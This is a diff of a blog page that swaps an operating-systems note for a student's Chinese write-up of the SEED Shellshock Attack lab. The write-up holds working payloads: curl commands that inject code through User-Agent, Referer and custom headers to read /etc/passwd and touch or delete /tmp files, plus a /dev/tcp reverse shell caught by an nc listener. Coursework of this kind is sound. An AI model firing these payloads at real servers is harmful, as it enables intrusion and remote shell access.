@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="操作系统课程笔记">
+  <meta name="description" content="软件安全课程实验2 Shellshock Attack lab">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>操作系统概念 - Zino&#39;s Blog</title>
+  <title>Shellshock Attack lab - Zino&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="操作系统概念">
+            <span class="h2" id="subtitle" title="Shellshock Attack lab">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-24 23:54" pubdate>
-        2021年10月24日 晚上
+      <time datetime="2021-10-29 10:54" pubdate>
+        2021年10月29日 上午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      886 字
+      831 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      12
        分钟
     </span>
   
@@ -233,39 +233,74 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">操作系统概念</h1>
+            <h1 style="display: none">Shellshock Attack lab</h1>
             
             <div class="markdown-body">
-              <h1 id="操作系统概念"><a href="#操作系统概念" class="headerlink" title="操作系统概念"></a>操作系统概念</h1><h2 id="第1章-导论"><a href="#第1章-导论" class="headerlink" title="第1章 导论"></a>第1章 导论</h2><h2 id="第2章-操作系统结构"><a href="#第2章-操作系统结构" class="headerlink" title="第2章 操作系统结构"></a>第2章 操作系统结构</h2><h2 id="第3章-进程"><a href="#第3章-进程" class="headerlink" title="第3章 进程"></a>第3章 进程</h2><h3 id="3-1-进程概念"><a href="#3-1-进程概念" class="headerlink" title="3.1 进程概念"></a>3.1 进程概念</h3><h4 id="3-1-1-进程"><a href="#3-1-1-进程" class="headerlink" title="3.1.1 进程"></a>3.1.1 进程</h4><p>进程包括文本段、堆栈段（包括临时数据，如函数参数、返回地址和局部变量）、数据段（包括全局变量）、堆（进程运行时动态分配的内存）</p>
-<p><img src="/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20210622073331434.png" srcset="/img/loading.gif" lazyload alt="image-20210622073331434"></p>
-<p><img src="/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024142834120.png" srcset="/img/loading.gif" lazyload alt="内存中的进程"></p>
-<h4 id="3-1-2-进程状态"><a href="#3-1-2-进程状态" class="headerlink" title="3.1.2 进程状态"></a>3.1.2 进程状态</h4><p>进程在执行时会改变状态。进程状态在某种程度上是由当前活动所定义的。每个进程可能处于下列状态之一：</p>
-<ul>
-<li>新的：进程正在被创建。</li>
-<li>运行： 指令正在被执行。</li>
-<li>等待：进程等待某个事件的发生（如I/O完成或收到信号）。</li>
-<li>就绪：进程等待分配处理器。</li>
-<li>终止：进程完成执行。</li>
+              <h1 id="Shellshock-Attack-lab"><a href="#Shellshock-Attack-lab" class="headerlink" title="Shellshock_Attack_lab"></a>Shellshock_Attack_lab</h1><h2 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vul.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	setuid(geteuid());<br>	system(<span class="hljs-string">&quot;/bin/ls -l&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先准备有漏洞的程序vul.c</p>
+<p>然后我们编译运行，并将其变成一个set-UID程序</p>
+<p>因为Ubuntu20.04中/bin/sh指向/bin/dash，而这个程序没有shellshock漏洞，所以需要更改符号链接，采用命令</p>
+<p><code>sudo ln -sf /bin/bash_shellshock /bin/sh</code></p>
+<p>同时我们发现20.04中/bin文件夹下没有bash_shellshock文件，所以我们需要sudo su进入root后自己cp一下。</p>
+<p>我们定义一个shell变量foo并输出它，这样当运行set-UID程序（vul)时，shell变量会变成子进程的环境变量。由于system函数的原因，Bash会被调用，它监测到环境变量foo中存放了一个环境声明，因此会解析该声明，由于逻辑解析的漏洞，它最终会执行放在末尾的/bin/sh指令，所以我之后会成功进入一个具有root权限的shell程序。</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027172958405.png" srcset="/img/loading.gif" lazyload alt="image-20211027172958405"></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027173023492.png" srcset="/img/loading.gif" lazyload alt="image-20211027173023492"></p>
+<p>将链接改回去后再次执行vul,我们发现程序正常，没有被攻击。</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027174008884.png" srcset="/img/loading.gif" lazyload alt="image-20211027174008884"></p>
+<h2 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h2><h3 id="task-2-A-Using-brower"><a href="#task-2-A-Using-brower" class="headerlink" title="task 2.A: Using brower"></a>task 2.A: Using brower</h3><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027180800482.png" srcset="/img/loading.gif" lazyload alt="image-20211027180800482"></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027180830505.png" srcset="/img/loading.gif" lazyload alt="image-20211027180830505"></p>
+<p> Apache服务器会从http请求头中获取信息，赋值给CGI程序的环境变量。</p>
+<h3 id="task-2-B-Using-curl"><a href="#task-2-B-Using-curl" class="headerlink" title="task 2.B Using curl"></a>task 2.B Using curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+
+<p>-v  打印出http请求头</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028162819689.png" srcset="/img/loading.gif" lazyload alt="image-20211028162819689"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+
+<p>-A  设置User-Agent</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028162913084.png" srcset="/img/loading.gif" lazyload alt="image-20211028162913084"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+
+<p>-e 设置Referer字段</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028163009475.png" srcset="/img/loading.gif" lazyload alt="image-20211028163009475"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+
+<p>-H 设置额外头字段</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028163108646.png" srcset="/img/loading.gif" lazyload alt="image-20211028163108646"></p>
+<h2 id="task-3"><a href="#task-3" class="headerlink" title="task 3"></a>task 3</h2><h3 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h3><ul>
+<li><strong>Get the server to send back the content of the /etc/passwd file.</strong></li>
 </ul>
-<p><img src="/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144135058.png" srcset="/img/loading.gif" lazyload alt="image-20211024144135058"></p>
-<h4 id="3-1-3-进程控制块"><a href="#3-1-3-进程控制块" class="headerlink" title="3.1.3 进程控制块"></a>3.1.3 进程控制块</h4><p>每个进程在操作系统内用进程控制块（process control block, PCB ，也称为任务控制块）来表示。</p>
-<p>图3.3 给出了一个PCB 的例子， 它包含许多与一个特定进程相关的信息。</p>
-<p><img src="/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144308211.png" srcset="/img/loading.gif" lazyload alt="image-20211024144308211"></p>
-<ul>
-<li>进程状态：状态可包括新的、就绪、运行、等待、停止等。</li>
-<li>程序计数器：计数器表示进程要执行的下个指令的地址。</li>
-<li> CPU 寄存器：根据计算机体系结构的不同， 寄存器的数量和类型也不同。它们包括累加器、索引寄存器、堆钱指针、通用寄存器和其他条件码信息寄存器。与程序计数器一起，这些状态信息在出现中断时也需要保存， 以便进程以后能正确地继续执行（见图3.4)。</li>
-<li> CPU 调度信息：这类信息包括进程优先级、调度队列的指针和其他调度参数（第5章讨论进程调度）。</li>
-<li>内存管理信息： 根据操作系统所使用的内存系统， 这类信息包括基址和界限寄存器的值、页表或段表（见第8章）。</li>
-<li>记账信息：这类信息包括CPU时间、实际使用时间、时间界限、记账数据、作业或进程数量等。</li>
-<li> I/O状态信息：这类信息包括分配给进程的1/0设备列表、打开的文件列表等。</li>
-</ul>
-<p><img src="/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144700188.png" srcset="/img/loading.gif" lazyload alt="image-20211024144700188"></p>
-<h4 id="3-1-4-线程"><a href="#3-1-4-线程" class="headerlink" title="3.1.4 线程"></a>3.1.4 线程</h4><p>迄今为止所讨论的进程模型暗示： 一个进程是一个只能进行单个执行线程的程序。例如， 如果一个进程运行一个字处理器程序， 那么只能执行单个线程指令。这种单一控制线程使得进程一次只能执行一个任务。例如， 用户不能在同一进程内， 同时输入字符和进行拼写检查。</p>
-<p>许多现代操作系统扩展了进程概念以支持一次能执行多个线程。第4章将讨论多线程进程。</p>
-<h3 id="3-2-进程调度"><a href="#3-2-进程调度" class="headerlink" title="3.2 进程调度"></a>3.2 进程调度</h3><p>多道程序设计的目的是无论何时都有进程在运行，从而使CPU利用率达到最大化。</p>
-<p>分时系统的目的是在进程之间快速切换CPU以便用户在程序运行时能与其进行交互。</p>
-<h4 id="3-2-1-调度队列"><a href="#3-2-1-调度队列" class="headerlink" title="3.2.1 调度队列"></a>3.2.1 调度队列</h4><h4 id="3-2-2-调度程序"><a href="#3-2-2-调度程序" class="headerlink" title="3.2.2 调度程序"></a>3.2.2 调度程序</h4><h4 id="3-2-3-上下文切換"><a href="#3-2-3-上下文切換" class="headerlink" title="3.2.3 上下文切換"></a>3.2.3 上下文切換</h4><h3 id="3-3-进程操作"><a href="#3-3-进程操作" class="headerlink" title="3.3 进程操作"></a>3.3 进程操作</h3><h4 id="3-3-1-进程创建"><a href="#3-3-1-进程创建" class="headerlink" title="3.3.1 进程创建"></a>3.3.1 进程创建</h4><h4 id="3-3-2-进程终止"><a href="#3-3-2-进程终止" class="headerlink" title="3.3.2 进程终止"></a>3.3.2 进程终止</h4><h3 id="3-4-进程间通信"><a href="#3-4-进程间通信" class="headerlink" title="3.4 进程间通信"></a>3.4 进程间通信</h3><h4 id="3-4-1-共享内存系统"><a href="#3-4-1-共享内存系统" class="headerlink" title="3.4.1 共享内存系统"></a>3.4.1 共享内存系统</h4><h4 id="3-4-2-消息传递系统"><a href="#3-4-2-消息传递系统" class="headerlink" title="3.4.2 消息传递系统"></a>3.4.2 消息传递系统</h4><h3 id="3-5-IPC系统的实例"><a href="#3-5-IPC系统的实例" class="headerlink" title="3.5 IPC系统的实例"></a>3.5 IPC系统的实例</h3><h4 id="3-5-1-实例：POSX共享内存"><a href="#3-5-1-实例：POSX共享内存" class="headerlink" title="3.5.1 实例：POSX共享内存"></a>3.5.1 实例：POSX共享内存</h4><h4 id="3-5-2-实例：Mach"><a href="#3-5-2-实例：Mach" class="headerlink" title="3.5.2 实例：Mach"></a>3.5.2 实例：Mach</h4><h2 id="第4章-线程"><a href="#第4章-线程" class="headerlink" title="第4章 线程"></a>第4章 线程</h2>
+<p>利用了-A修改User-Agent字段</p>
+<p>执行命令</p>
+<p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028165749466.png" srcset="/img/loading.gif" lazyload alt="image-20211028165749466"></p>
+<h3 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B:"></a>Task 3.B:</h3><p> <strong>Get the server to tell you its process’ user ID. Y ou can use the /bin/id command to print out the ID information.</strong></p>
+<p>利用-e修改Referer字段来获取ID</p>
+<p>执行命令</p>
+<p><code>curl -e &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028170325981.png" srcset="/img/loading.gif" lazyload alt="image-20211028170325981"></p>
+<h3 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C:"></a>Task 3.C:</h3><p> <strong>Get the server to create a file inside the /tmp folder. Y ou need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</strong></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028172005730.png" srcset="/img/loading.gif" lazyload alt="image-20211028172005730"></p>
+<p>利用-H创建额外头字段</p>
+<p>查看tmp</p>
+<p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/ls  /tmp &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p>创建test</p>
+<p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/touch  /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028193945048.png" srcset="/img/loading.gif" lazyload alt="image-20211028193945048"></p>
+<h3 id="Task-3-D"><a href="#Task-3-D" class="headerlink" title="Task 3.D:"></a>Task 3.D:</h3><p> <strong>Get the server to delete the file that you just created inside the /tmp folder</strong></p>
+<p>删除test</p>
+<p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028194013384.png" srcset="/img/loading.gif" lazyload alt="image-20211028194013384"></p>
+<p>Q1:不能打开/etc/shadow，因为只是www-data权限，权限不够，需要root权限</p>
+<p>Q2：不能成功，不能成功将带空格的字符串设置为环境变量，所以不能攻击成功</p>
+<h2 id="test-4"><a href="#test-4" class="headerlink" title="test 4"></a>test 4</h2><p><code>nc -lvnp 9090</code></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205201563.png" srcset="/img/loading.gif" lazyload alt="image-20211028205201563"></p>
+<p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205013091.png" srcset="/img/loading.gif" lazyload alt="image-20211028205013091"></p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205206476.png" srcset="/img/loading.gif" lazyload alt="image-20211028205206476"></p>
+<h2 id="test-5"><a href="#test-5" class="headerlink" title="test 5"></a>test 5</h2><p>新建一个vul.cgi修改为bash后，重新dcbuild一个容器，后再次执行攻击，发现攻击无法成功。因为bash填补了shellshock漏洞，所以无法攻击成功。</p>
+<p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028211429143.png" srcset="/img/loading.gif" lazyload alt="image-20211028211429143"></p>
+
             </div>
             <hr>
             <div>
@@ -274,7 +309,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+                      <a class="hover-with-bg" href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a>
                     
                   </div>
                 
@@ -282,7 +317,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+                      <a class="hover-with-bg" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a>
                     
                   </div>
                 
@@ -299,18 +334,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/29/Shellshock_Attack_lab/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Shellshock Attack lab</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/">
-                        <span class="hidden-mobile">环境变量和set-UID程序</span>
+                      <a href="/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/">
+                        <span class="hidden-mobile">操作系统概念</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -332,8 +361,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'http://example.com/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/';
-          this.page.identifier = '/2021/10/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/';
+          this.page.url = 'http://example.com/2021/10/29/Shellshock_Attack_lab/';
+          this.page.identifier = '/2021/10/29/Shellshock_Attack_lab/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
